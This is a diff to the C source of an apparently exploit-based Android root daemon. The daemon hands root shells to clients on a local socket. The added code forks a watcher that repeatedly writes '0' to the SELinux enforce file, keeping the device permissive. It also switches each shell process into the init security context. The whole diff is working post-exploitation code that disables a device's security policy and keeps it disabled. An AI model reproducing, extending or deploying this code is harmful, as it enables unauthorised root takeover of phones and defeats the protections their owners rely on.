@@ -28,18 +28,63 @@ static int read_exact(int fd, void *buffer, size_t length)
 	return 0;
 }
 
-static void set_su_context(void)
+static int selinux_is_permissive(void)
 {
-	/* The exploit process has a NULL/invalid SELinux context.  init/property
-	   service then fails getpeercon() and refuses setprop.  Switch the exec
-	   child to a valid root-ish domain first; permissive mode permits it. */
-	static const char ctx[] = "u:r:system_server:s0";
+	char state = 0;
+	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+	if (fd < 0) return -1;
+	ssize_t n = read(fd, &state, 1);
+	close(fd);
+	return n == 1 && state == '0' ? 0 : -1;
+}
+
+static int maintain_permissive(void)
+{
+	if (selinux_is_permissive() == 0) return 0;
+	int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
+	if (fd < 0) return -1;
+	ssize_t n = write(fd, "0", 1);
+	int saved_errno = errno;
+	close(fd);
+	if (n != 1) {
+		errno = saved_errno;
+		return -1;
+	}
+	return selinux_is_permissive();
+}
+
+static int set_su_context(void)
+{
+	static const char ctx[] = "u:r:init:s0";
 	int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
-	if (fd >= 0) {
-		ssize_t n = write(fd, ctx, sizeof(ctx) - 1);
-		if (n < 0)
-			dprintf(STDERR_FILENO, "[rootd] setcon su failed errno=%d\n", errno);
-		close(fd);
+	if (fd < 0) {
+		dprintf(STDERR_FILENO, "[rootd] open setcon failed errno=%d\n", errno);
+		return -1;
+	}
+	ssize_t n = write(fd, ctx, sizeof(ctx) - 1);
+	int saved_errno = errno;
+	close(fd);
+	if (n != (ssize_t)(sizeof(ctx) - 1)) {
+		dprintf(STDERR_FILENO, "[rootd] setcon init failed errno=%d\n", saved_errno);
+		return -1;
+	}
+	return 0;
+}
+
+static void policy_watch(void)
+{
+	pid_t owner = getppid();
+	int failed = 0;
+	for (;;) {
+		if (getppid() != owner) _exit(0);
+		if (maintain_permissive() < 0) {
+			if (!failed)
+				dprintf(STDERR_FILENO, "[rootd] permissive watch failed errno=%d\n", errno);
+			failed = 1;
+		} else {
+			failed = 0;
+		}
+		usleep(200000);
 	}
 }
 
@@ -75,10 +120,13 @@ static void handle_client(int fd)
 	pid_t child = fork();
 	if (child < 0) return;
 	if (child == 0) {
-		set_su_context();
 		(void)dup2(fd, STDIN_FILENO);
 		(void)dup2(fd, STDOUT_FILENO);
 		(void)dup2(fd, STDERR_FILENO);
+		if (maintain_permissive() < 0 || set_su_context() < 0) {
+			dprintf(STDERR_FILENO, "ROOT98260_CHILD_POLICY_FAILED\n");
+			_exit(125);
+		}
 		if (fd > STDERR_FILENO) close(fd);
 		char *const env[] = { (char *)"PATH=/system/bin:/vendor/bin:/data/local/tmp",
 			(char *)"HOME=/data/local/tmp", NULL };
@@ -127,6 +175,18 @@ int pc98260_run_rootd(void)
 	}
 	dprintf(STDERR_FILENO, "[rootd] listening at %s pid=%d\n",
 		path, getpid());
+	pid_t watcher = fork();
+	if (watcher < 0) {
+		dprintf(STDERR_FILENO, "[rootd] policy watch fork failed errno=%d\n", errno);
+		close(listener);
+		(void)unlink(path);
+		return 1;
+	}
+	if (watcher == 0) {
+		policy_watch();
+		_exit(0);
+	}
+	dprintf(STDERR_FILENO, "[rootd] permissive watch pid=%d context=u:r:init:s0\n", watcher);
 	for (;;) {
 		int client = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
 		if (client < 0) {
